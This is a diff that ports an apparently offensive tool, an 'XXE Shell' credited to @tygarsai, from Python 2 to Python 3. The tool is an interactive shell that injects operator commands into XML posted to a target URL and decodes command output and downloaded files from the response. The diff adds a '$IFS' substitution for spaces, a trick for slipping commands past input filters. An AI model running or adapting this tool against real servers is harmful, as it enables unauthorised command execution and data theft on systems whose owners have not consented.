@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 
 import argparse
 import base64
@@ -33,23 +33,23 @@ class XXECommandLine(cmd.Cmd):
         req = requests.post(self.url, data=self.fxml.replace('CMD', arg))
         with open(fname, 'wb') as fh:
             fh.write(base64.b64decode(
-                re.findall(ur'OUT([a-zA-Z0-9].+?)OUT', req.content)[0]))
+                re.findall(r'OUT([a-zA-Z0-9].+?)OUT', str(req.content))[0]))
 
     def do_cmd(self, cmd):
-        req = requests.post(self.url, data=self.xml.replace('CMD', cmd))
-        print base64.b64decode(
-            re.findall(ur'OUT([a-zA-Z0-9].+?)OUT', req.content)[0])
+        req = requests.post(self.url, data=self.xml.replace('CMD', cmd.replace(' ', '$IFS')))
+        print(base64.b64decode(
+            re.findall(r'OUT([a-zA-Z0-9].+?)OUT', str(req.content))[0]).decode('utf-8'))
 
 
 def banner():
-    print '____  _______  ______________   _________.__           .__  .__   '
-    print '\   \/  /\   \/  /\_   _____/  /   _____/|  |__   ____ |  | |  |  '
-    print ' \     /  \     /  |    __)_   \_____  \ |  |  \_/ __ \|  | |  |  '
-    print ' /     \  /     \  |        \  /        \|   Y  \  ___/|  |_|  |__'
-    print '/___/\  \/___/\  \/_______  / /_______  /|___|  /\___  >____/____/'
-    print '      \_/      \_/        \/          \/      \/     \/           '
-    print '                                                        @tygarsai '
-    print ''
+    print(r'____  _______  ______________   _________.__           .__  .__   ')
+    print(r'\   \/  /\   \/  /\_   _____/  /   _____/|  |__   ____ |  | |  |  ')
+    print(r' \     /  \     /  |    __)_   \_____  \ |  |  \_/ __ \|  | |  |  ')
+    print(r' /     \  /     \  |        \  /        \|   Y  \  ___/|  |_|  |__')
+    print(r'/___/\  \/___/\  \/_______  / /_______  /|___|  /\___  >____/____/')
+    print(r'      \_/      \_/        \/          \/      \/     \/           ')
+    print(r'                                                        @tygarsai ')
+    print(r'')
 
 
 if __name__ == '__main__':
